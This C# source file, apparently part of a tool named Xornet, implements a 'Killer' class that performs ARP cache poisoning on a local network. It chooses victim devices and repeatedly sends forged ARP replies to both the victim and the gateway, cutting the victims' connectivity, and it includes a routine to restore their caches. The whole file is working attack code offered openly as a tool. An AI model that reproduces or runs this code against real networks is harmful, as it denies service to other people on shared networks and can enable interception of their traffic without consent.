using System.Collections.Concurrent;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Xornet.Data;
using Xornet.Models;
using Xornet.Services;
using Xornet.Utils;

namespace Xornet.Engine;

public class Killer : IDisposable
{
    private readonly Scanner _scanner;
    private readonly DeviceManager _deviceManager;
    private readonly XornetConfig _config;

    private readonly ConcurrentDictionary<string, bool> _killedClientMacs = new();
    private readonly ConcurrentDictionary<string, DateTime> _lastSpoofTime = new();
    private readonly ConcurrentDictionary<string, bool> _burstDone = new();
    private readonly SemaphoreSlim _newVictimSignal = new(0, 1);
    private CancellationTokenSource? _cancellationTokenSource;
    private Task? _killerTask;
    private LibPcapLiveDevice? _device;

    public Killer(Scanner scanner, DeviceManager deviceManager)
    {
        _scanner = scanner ?? throw new ArgumentNullException(nameof(scanner));
        _deviceManager = deviceManager ?? throw new ArgumentNullException(nameof(deviceManager));
        _config = ConfigStore.Load();
    }

    public void Start()
    {
        if (_killerTask != null) return;

        _device = _deviceManager.CreateDevice("arp", 1000);
        _cancellationTokenSource = new CancellationTokenSource();
        _killerTask = Task.Run(StartKillerJob);
    }

    public void Stop()
    {
        _cancellationTokenSource?.Cancel();
        _killerTask?.Wait(TimeSpan.FromSeconds(2));
        _killerTask?.Dispose();
        _killerTask = null;

        if (_device != null)
        {
            try { _device.StopCapture(); } catch { }
            try { _device.Close(); } catch { }
            try { _device.Dispose(); } catch { }
            _device = null;
        }

        _cancellationTokenSource?.Dispose();
        _cancellationTokenSource = null;
    }

    public void Kill(Client victim)
    {
        if (victim?.Mac == null || victim.Mac.Equals(PhysicalAddress.None))
            return;

        var hasClient = _scanner.GetClients().TryGetValue(victim.GetMacString(), out Client? client);
        if (!hasClient || client == null) return;
        if (client.IsLocalDevice() || client.IsGateway() || client.IsKilled) return;

        client.IsKilled = true;
        var macStr = client.GetMacString();

        if (!_killedClientMacs.ContainsKey(macStr))
        {
            _killedClientMacs.TryAdd(macStr, true);

            try
            {
                if (_newVictimSignal.CurrentCount == 0)
                    _newVictimSignal.Release();
            }
            catch (SemaphoreFullException) { /* Already signaled */ }
        }

        SendInitialBurst(client);
    }

    public void UnKill(Client victim)
    {
        var hasClient = _scanner.GetClients().TryGetValue(victim.GetMacString(), out Client? client);
        if (!hasClient || client == null) return;

        client.IsKilled = false;
        _killedClientMacs.TryRemove(client.GetMacString(), out _);
        _lastSpoofTime.TryRemove(client.GetMacString(), out _);
        _burstDone.TryRemove(client.GetMacString(), out _);

        RestoreTarget(client);
    }

    public void UnKillAll()
    {
        foreach (var kvp in _scanner.GetClients())
        {
            var client = kvp.Value;
            if (client.IsKilled)
            {
                client.IsKilled = false;
                _killedClientMacs.TryRemove(kvp.Key, out _);
                _lastSpoofTime.TryRemove(kvp.Key, out _);
                _burstDone.TryRemove(kvp.Key, out _);
                RestoreTarget(client);
            }
        }
    }

    public IReadOnlyCollection<string> GetKilledMacs() => _killedClientMacs.Keys.ToList();

    private async Task StartKillerJob()
    {
        if (_device == null || _cancellationTokenSource == null) return;

        while (!_cancellationTokenSource.Token.IsCancellationRequested)
        {
            if (_killedClientMacs.Count > 0)
            {
                RefreshGatewayMacIfStale();

                var clients = _scanner.GetClients();
                var killedMacs = _killedClientMacs.Keys.ToList();

                Parallel.ForEach(killedMacs, killedMac =>
                {
                    if (!clients.TryGetValue(killedMac, out var client)) return;
                    if (!client.IsKilled) return;

                    var lastSpoof = _lastSpoofTime.GetOrAdd(killedMac, DateTime.MinValue);
                    if ((DateTime.UtcNow - lastSpoof).TotalMilliseconds >= _config.SpoofIntervalMs)
                    {
                        SpoofVictim(client);
                        SpoofGateway(client);
                        _lastSpoofTime[killedMac] = DateTime.UtcNow;
                    }
                });

                try
                {
                    await Task.Delay(_config.SpoofIntervalMs, _cancellationTokenSource.Token);
                }
                catch (OperationCanceledException) { break; }
            }
            else
            {
                try
                {
                    await _newVictimSignal.WaitAsync(5000, _cancellationTokenSource.Token);
                }
                catch (OperationCanceledException) { break; }
            }
        }
    }

    private void SpoofVictim(Client victim)
    {
        if (HostInfo.GatewayIp == null || HostInfo.HostMac == null || _device == null) return;

        var arpReply = new ArpPacket(
            ArpOperation.Response,
            targetHardwareAddress: victim.Mac,
            targetProtocolAddress: victim.Ip,
            senderHardwareAddress: HostInfo.HostMac,
            senderProtocolAddress: HostInfo.GatewayIp);

        var ethPacket = new EthernetPacket(
            sourceHardwareAddress: HostInfo.HostMac,
            destinationHardwareAddress: victim.Mac,
            EthernetType.Arp)
        {
            PayloadPacket = arpReply
        };

        _device.SendPacket(ethPacket.Bytes);
    }

    private void SpoofGateway(Client victim)
    {
        if (HostInfo.GatewayIp == null || HostInfo.GatewayMac == null || HostInfo.HostMac == null || _device == null) return;

        var arpReply = new ArpPacket(
            ArpOperation.Response,
            targetHardwareAddress: HostInfo.GatewayMac,
            targetProtocolAddress: HostInfo.GatewayIp,
            senderHardwareAddress: HostInfo.HostMac,
            senderProtocolAddress: victim.Ip);

        var ethPacket = new EthernetPacket(
            sourceHardwareAddress: HostInfo.HostMac,
            destinationHardwareAddress: HostInfo.GatewayMac,
            EthernetType.Arp)
        {
            PayloadPacket = arpReply
        };

        _device.SendPacket(ethPacket.Bytes);
    }

    private void SendInitialBurst(Client victim)
    {
        var macStr = victim.GetMacString();
        _burstDone.TryAdd(macStr, true);

        for (int i = 0; i < _config.InitialBurstCount; i++)
        {
            SpoofVictim(victim);
            SpoofGateway(victim);
            if (i < _config.InitialBurstCount - 1)
                Thread.Sleep(_config.InitialBurstIntervalMs);
        }

        _lastSpoofTime[macStr] = DateTime.UtcNow;
    }

    private void RestoreTarget(Client victim)
    {
        if (HostInfo.GatewayIp == null || HostInfo.GatewayMac == null || HostInfo.HostMac == null || _device == null) return;

        // 1. Restore victim's ARP cache: "Gateway IP = real GatewayMac"
        var replyToVictim = new ArpPacket(
            ArpOperation.Response,
            targetHardwareAddress: victim.Mac,
            targetProtocolAddress: victim.Ip,
            senderHardwareAddress: HostInfo.GatewayMac,
            senderProtocolAddress: HostInfo.GatewayIp);

        var ethToVictim = new EthernetPacket(
            sourceHardwareAddress: HostInfo.GatewayMac,
            destinationHardwareAddress: victim.Mac,
            EthernetType.Arp)
        {
            PayloadPacket = replyToVictim
        };
        _device.SendPacket(ethToVictim.Bytes);

        // 2. Restore gateway's ARP cache: "Victim IP = real victim Mac"
        var replyToGateway = new ArpPacket(
            ArpOperation.Response,
            targetHardwareAddress: HostInfo.GatewayMac,
            targetProtocolAddress: HostInfo.GatewayIp,
            senderHardwareAddress: victim.Mac,
            senderProtocolAddress: victim.Ip);

        var ethToGateway = new EthernetPacket(
            sourceHardwareAddress: victim.Mac,
            destinationHardwareAddress: HostInfo.GatewayMac,
            EthernetType.Arp)
        {
            PayloadPacket = replyToGateway
        };
        _device.SendPacket(ethToGateway.Bytes);
    }

    private void RefreshGatewayMacIfStale()
    {
        if (HostInfo.GatewayMac != null) return;

        // Gateway MAC might become stale, try to re-resolve
        if (HostInfo.GatewayIp != null && HostInfo.HostIp != null && HostInfo.HostMac != null)
        {
            try
            {
                var device = _deviceManager.Device;
                var arp = new ARP(device);
                var resolved = arp.Resolve(HostInfo.GatewayIp, HostInfo.HostIp, HostInfo.HostMac);
                if (resolved != null)
                {
                    typeof(HostInfo).GetProperty("GatewayMac")?.SetValue(null, resolved);
                }
            }
            catch { /* ignore */ }
        }
    }

    public void Dispose()
    {
        Stop();
        _newVictimSignal.Dispose();
    }
}
